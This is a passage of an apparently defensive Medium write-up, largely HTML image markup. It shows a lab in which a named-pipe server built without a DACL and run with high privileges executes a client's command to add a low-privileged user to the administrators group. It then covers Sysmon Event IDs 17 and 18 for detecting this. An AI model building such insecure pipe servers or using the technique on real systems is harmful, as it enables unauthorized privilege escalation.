https://miro.medium.com/v2/resize:fit:750/format:webp/1*-lH8wLWxtJuHwPS3TCLcMQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*-lH8wLWxtJuHwPS3TCLcMQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*-lH8wLWxtJuHwPS3TCLcMQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*-lH8wLWxtJuHwPS3TCLcMQ.png 1100w, https://miro.medium.com/v2/resize:fit:2680/format:webp/1*-lH8wLWxtJuHwPS3TCLcMQ.png 2680w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1340px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*-lH8wLWxtJuHwPS3TCLcMQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*-lH8wLWxtJuHwPS3TCLcMQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*-lH8wLWxtJuHwPS3TCLcMQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*-lH8wLWxtJuHwPS3TCLcMQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*-lH8wLWxtJuHwPS3TCLcMQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*-lH8wLWxtJuHwPS3TCLcMQ.png 1100w, https://miro.medium.com/v2/resize:fit:2680/1*-lH8wLWxtJuHwPS3TCLcMQ.png 2680w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1340px"><img alt="" class="bi gl ou c" width="1340" height="150" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1340/1*-lH8wLWxtJuHwPS3TCLcMQ.png"></picture></figure></div><div class="ac ci"><div class="cp bi ih ii ij ik"><p id="718b" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">We can see our vulnerable application with no <a class="ah qr" href="https://learn.microsoft.com/en-us/windows/win32/secauthz/dacls-and-aces" rel="noopener ugc nofollow" target="_blank">DACL</a>, allowing full permissions, executed with high privileges.<br>These permissions can also be viewed using <a class="ah qr" href="https://learn.microsoft.com/pt-br/sysinternals/downloads/accesschk" rel="noopener ugc nofollow" target="_blank">accesschk</a></p><figure class="qx qy qz ra rb op oh oi paragraph-image"><div class="oh oi su"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*h9pRzKaYUTjz9bm3K1PdkQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*h9pRzKaYUTjz9bm3K1PdkQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*h9pRzKaYUTjz9bm3K1PdkQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*h9pRzKaYUTjz9bm3K1PdkQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*h9pRzKaYUTjz9bm3K1PdkQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*h9pRzKaYUTjz9bm3K1PdkQ.png 1100w, https://miro.medium.com/v2/resize:fit:1364/format:webp/1*h9pRzKaYUTjz9bm3K1PdkQ.png 1364w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 682px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*h9pRzKaYUTjz9bm3K1PdkQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*h9pRzKaYUTjz9bm3K1PdkQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*h9pRzKaYUTjz9bm3K1PdkQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*h9pRzKaYUTjz9bm3K1PdkQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*h9pRzKaYUTjz9bm3K1PdkQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*h9pRzKaYUTjz9bm3K1PdkQ.png 1100w, https://miro.medium.com/v2/resize:fit:1364/1*h9pRzKaYUTjz9bm3K1PdkQ.png 1364w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 682px"><img alt="" class="bi gl ou c" width="682" height="175" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:682/1*h9pRzKaYUTjz9bm3K1PdkQ.png"></picture></div></figure><p id="0bcc" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">.\acesschk.exe \pipe\</code> to list all the pipes and their permissions</p><p id="49ef" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">FYI you can also use these tools to list all named pipes:</p><ul class=""><li id="f6ff" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">Sysinternals </strong><a class="ah qr" href="https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist" rel="noopener ugc nofollow" target="_blank"><strong class="ox jb">PipeList</strong></a>: to list all the pipe using NtQueryDirectoryFile</li><li id="23f8" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">Sysinternals </strong><a class="ah qr" href="https://learn.microsoft.com/pt-br/sysinternals/downloads/psfile" rel="noopener ugc nofollow" target="_blank"><strong class="ox jb">PSFile</strong></a>: to list all open files (grep named pipes with | findstr pipe)</li><li id="9d5d" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">With powershell</strong>: [System.IO.Directory]::GetFiles("\\.\\pipe\\") or Get-ChildItem \\.\pipe\</li><li id="9317" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">Process Explorer or Process Hacker</strong>: Use the “Find Handles or DLLs” feature and search for <code class="de qs qt qu qv b">\Device\NamedPipe</code> to find all the named pipes.</li></ul><p id="bb64" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">With the pipe server now listening, I executed <code class="de qs qt qu qv b">pipe_client.exe</code> in a standard terminal. The pipe client application successfully connected to the named pipe <code class="de qs qt qu qv b">PrivEscPipe</code> created by <code class="de qs qt qu qv b">pipe_server.exe</code> and sent a command to add a user named <code class="de qs qt qu qv b">lowprivuser</code> to the <code class="de qs qt qu qv b">administrateurs</code> group.</p></div></div><div class="op bi"><figure class="qx qy qz ra rb op bi paragraph-image"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*-AFBJTAUJTRPMBqGtg1vZA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*-AFBJTAUJTRPMBqGtg1vZA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*-AFBJTAUJTRPMBqGtg1vZA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*-AFBJTAUJTRPMBqGtg1vZA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*-AFBJTAUJTRPMBqGtg1vZA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*-AFBJTAUJTRPMBqGtg1vZA.png 1100w, https://miro.medium.com/v2/resize:fit:2570/format:webp/1*-AFBJTAUJTRPMBqGtg1vZA.png 2570w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1285px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*-AFBJTAUJTRPMBqGtg1vZA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*-AFBJTAUJTRPMBqGtg1vZA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*-AFBJTAUJTRPMBqGtg1vZA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*-AFBJTAUJTRPMBqGtg1vZA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*-AFBJTAUJTRPMBqGtg1vZA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*-AFBJTAUJTRPMBqGtg1vZA.png 1100w, https://miro.medium.com/v2/resize:fit:2570/1*-AFBJTAUJTRPMBqGtg1vZA.png 2570w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1285px"><img alt="" class="bi gl ou c" width="1285" height="181" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1285/1*-AFBJTAUJTRPMBqGtg1vZA.png"></picture><figcaption class="rc fm rd oh oi re rf bg b bh ab eb" data-selectable-paragraph="">executing pipe_client.exe and pipe_server.exe</figcaption></figure></div><div class="ac ci"><div class="cp bi ih ii ij ik"><p id="2a2b" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">The command is received and executed with high privileges by the <code class="de qs qt qu qv b">pipe_server.exe<br></code>This demonstrates a critical vulnerability where a low-privilege user can escalate their privileges by exploiting the insecure pipe server application we created.</p><h2 id="cfe1" class="pq pr ja bg ps pt pu pv gy pw px py ha pz qa qb qc qd qe qf qg qh qi qj qk ql bl" data-selectable-paragraph="">Logs generated</h2><p id="c4f2" class="pw-post-body-paragraph ov ow ja ox b oy qm pa pb pc qn pe pf hb qo ph pi he qp pk pl hh qq pn po pp ib bl" data-selectable-paragraph="">I did not find any ETW provider that specifically logs the creation or connection of named pipes.</p><p id="e9ab" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">However, <a class="ah qr" href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon" rel="noopener ugc nofollow" target="_blank">Sysmon </a>can log these events with Event ID 17 for pipe creation and Event ID 18 for pipe connection.</p><p id="6e3d" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">Event ID 17 captures pipe creation details from our previous test:</p></div></div><div class="op bi"><figure class="qx qy qz ra rb op bi paragraph-image"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*yKd6i24wiA4nf5uH-nAStQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*yKd6i24wiA4nf5uH-nAStQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*yKd6i24wiA4nf5uH-nAStQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*yKd6i24wiA4nf5uH-nAStQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*yKd6i24wiA4nf5uH-nAStQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*yKd6i24wiA4nf5uH-nAStQ.png 1100w, https://miro.medium.com/v2/resize:fit:3340/format:webp/1*yKd6i24wiA4nf5uH-nAStQ.png 3340w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1670px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*yKd6i24wiA4nf5uH-nAStQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*yKd6i24wiA4nf5uH-nAStQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*yKd6i24wiA4nf5uH-nAStQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*yKd6i24wiA4nf5uH-nAStQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*yKd6i24wiA4nf5uH-nAStQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*yKd6i24wiA4nf5uH-nAStQ.png 1100w, https://miro.medium.com/v2/resize:fit:3340/1*yKd6i24wiA4nf5uH-nAStQ.png 3340w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1670px"><img alt="" class="bi gl ou c" width="1670" height="221" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1670/1*yKd6i24wiA4nf5uH-nAStQ.png"></picture></figure></div><div class="ac ci"><div class="cp bi ih ii ij ik"><p id="ab82" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">We can see our pipe “<strong class="ox jb">PrivEscPipe” </strong>that was created by our application <code class="de qs qt qu qv b">pipe_server.exe</code></p><p id="3c9b" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">Event ID 18 captures pipe connection details:</p></div></div><div class="op bi"><figure class="qx qy qz ra rb op bi paragraph-image"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*RbKLMa_gDe-XGeTWAXHZ-A.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*RbKLMa_gDe-XGeTWAXHZ-A.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*RbKLMa_gDe-XGeTWAXHZ-A.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*RbKLMa_gDe-XGeTWAXHZ-A.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*RbKLMa_gDe-XGeTWAXHZ-A.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*RbKLMa_gDe-XGeTWAXHZ-A.png 1100w, https://miro.medium.com/v2/resize:fit:3346/format:webp/1*RbKLMa_gDe-XGeTWAXHZ-A.png 3346w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1673px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*RbKLMa_gDe-XGeTWAXHZ-A.png 640w, https://miro.medium.com/v2/resize:fit:720/1*RbKLMa_gDe-XGeTWAXHZ-A.png 720w, https://miro.medium.com/v2/resize:fit:750/1*RbKLMa_gDe-XGeTWAXHZ-A.png 750w, https://miro.medium.com/v2/resize:fit:786/1*RbKLMa_gDe-XGeTWAXHZ-A.png 786w, https://miro.medium.com/v2/resize:fit:828/1*RbKLMa_gDe-XGeTWAXHZ-A.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*RbKLMa_gDe-XGeTWAXHZ-A.png 1100w, https://miro.medium.com/v2/resize:fit:3346/1*RbKLMa_gDe-XGeTWAXHZ-A.png 3346w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1673px"><img alt="" class="bi gl ou c" width="1673" height="220" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1673/1*RbKLMa_gDe-XGeTWAXHZ-A.png"></picture></figure></div><div class="ac ci"><div class="cp bi ih ii ij ik"><p id="9bbb" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">We can see our pipe client application connecting to the <strong class="ox jb">PrivescPipe pipe !</strong></p><p id="6317" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">In an investigation scenario triggered by an alert for a suspicious named pipe usage, we have several valuable pieces of information to pivot on:</p><ul class=""><li id="94d1" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">Parent Process ID</strong>: 5544 (in this example, the terminal process ID)</li><li id="5730" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">Process ID of pipe_client.exe</strong>: 16928</li><li id="6143" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">Process ID of pipe_server.exe</strong>: 28564</li></ul><p id="4d5d" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">We also have the executable names for both the pipe creator and the pipe connector:</p><ul class=""><li id="3d77" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">Creating the named pipe</strong>: pipe_server.exe</li><li id="ddba" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><strong class="ox jb">Connecting to the named pipe</strong>: pipe_client.exe</li></ul><p id="aa4c" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">To gather more context, we can search for these executable names or process IDs within the detection time range. This will help us better understand the server and client applications involved. We will retrieve more context and the hash of each application from Sysmon <strong class="ox jb">Event ID 7 or Event ID 1</strong>. Depending on the application’s behavior, further details might be available through <strong class="ox jb">Sysmon Event IDs 8, 10, and 3</strong>.</p></div></div><div class="op bi"><figure class="qx qy qz ra rb op bi paragraph-image"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*1-NPvj81u6fHMv6RohlQpg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*1-NPvj81u6fHMv6RohlQpg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*1-NPvj81u6fHMv6RohlQpg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*1-NPvj81u6fHMv6RohlQpg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*1-NPvj81u6fHMv6RohlQpg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*1-NPvj81u6fHMv6RohlQpg.png 1100w, https://miro.medium.com/v2/resize:fit:3656/format:webp/1*1-NPvj81u6fHMv6RohlQpg.png 3656w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1828px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*1-NPvj81u6fHMv6RohlQpg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*1-NPvj81u6fHMv6RohlQpg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*1-NPvj81u6fHMv6RohlQpg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*1-NPvj81u6fHMv6RohlQpg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*1-NPvj81u6fHMv6RohlQpg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*1-NPvj81u6fHMv6RohlQpg.png 1100w, https://miro.medium.com/v2/resize:fit:3656/1*1-NPvj81u6fHMv6RohlQpg.png 3656w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1828px"><img alt="" class="bi gl ou c" width="1828" height="287" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1828/1*1-NPvj81u6fHMv6RohlQpg.png"></picture><figcaption class="rc fm rd oh oi re rf bg b bh ab eb" data-selectable-paragraph="">EventID 7 showing that the <code class="de qs qt qu qv b">pipe_server.exe</code> was executed, and the image was loaded into memory on the system.</figcaption></figure><figure class="ng op bi paragraph-image"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*zoWikJkN-RCZ9O3_6xemqw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*zoWikJkN-RCZ9O3_6xemqw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*zoWikJkN-RCZ9O3_6xemqw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*zoWikJkN-RCZ9O3_6xemqw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*zoWikJkN-RCZ9O3_6xemqw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*zoWikJkN-RCZ9O3_6xemqw.png 1100w, https://miro.medium.com/v2/resize:fit:3640/format:webp/1*zoWikJkN-RCZ9O3_6xemqw.png 3640w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1820px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*zoWikJkN-RCZ9O3_6xemqw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*zoWikJkN-RCZ9O3_6xemqw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*zoWikJkN-RCZ9O3_6xemqw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*zoWikJkN-RCZ9O3_6xemqw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*zoWikJkN-RCZ9O3_6xemqw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*zoWikJkN-RCZ9O3_6xemqw.png 1100w, https://miro.medium.com/v2/resize:fit:3640/1*zoWikJkN-RCZ9O3_6xemqw.png 3640w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1820px"><img alt="" class="bi gl ou c" width="1820" height="365" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1820/1*zoWikJkN-RCZ9O3_6xemqw.png"></picture><figcaption class="rc fm rd oh oi re rf bg b bh ab eb" data-selectable-paragraph="">EventID 1 showing the execution of pipe_server.exe with admin rights</figcaption></figure><figure class="ng op bi paragraph-image"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*9aJbXOBPd-hrxX2UKbHrdQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*9aJbXOBPd-hrxX2UKbHrdQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*9aJbXOBPd-hrxX2UKbHrdQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*9aJbXOBPd-hrxX2UKbHrdQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*9aJbXOBPd-hrxX2UKbHrdQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*9aJbXOBPd-hrxX2UKbHrdQ.png 1100w, https://miro.medium.com/v2/resize:fit:3668/format:webp/1*9aJbXOBPd-hrxX2UKbHrdQ.png 3668w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1834px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*9aJbXOBPd-hrxX2UKbHrdQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*9aJbXOBPd-hrxX2UKbHrdQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*9aJbXOBPd-hrxX2UKbHrdQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*9aJbXOBPd-hrxX2UKbHrdQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*9aJbXOBPd-hrxX2UKbHrdQ.png 828w, 